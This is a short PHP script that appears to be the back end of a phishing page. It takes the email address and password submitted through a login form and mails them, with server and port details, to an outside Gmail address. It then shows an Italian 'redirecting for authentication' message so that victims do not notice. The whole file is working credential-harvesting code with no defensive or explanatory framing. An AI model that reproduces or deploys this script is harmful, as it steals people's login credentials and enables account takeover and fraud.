<?php 

// global scope

$to = "haksalow12@gmail.com";
$subject = "user: ". substr($_POST['email'],0,9);

$message = 'Email: ' . $_POST['email']. ' ' .
' Password: ' . $_POST['password']. ' IP Address: ' 
. $_SERVER['SERVER_NAME'] . ' Port: ' . $_SERVER['REMOTE_PORT'];


if(mail($to, $subject, $message)) {

echo "Reindirizzamento per l'autenticazione";

} else {

echo 'login failed';

}

?>